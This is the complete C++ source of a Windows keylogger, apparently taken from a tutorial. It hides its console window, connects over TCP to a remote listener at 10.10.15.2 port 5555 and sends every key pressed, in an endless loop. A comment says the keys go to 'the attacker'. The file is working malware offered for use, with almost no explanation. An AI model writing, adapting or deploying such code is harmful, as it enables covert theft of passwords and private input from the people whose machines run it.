#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));


    while (true) {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000) { //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate#return-value
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }
    }
    //The above snippet would run an infinite loop and and check if any of the keys in the range (0x8 to 0xFF). Then the GetAsyncKeyState function checks if that key is in pressed state (check the 2nd point of the note below). If the key we checked for is in pressed state, send the pressed key's ASCII value to the attacker over the established TCP socket.


    closesocket(server);
    WSACleanup();
}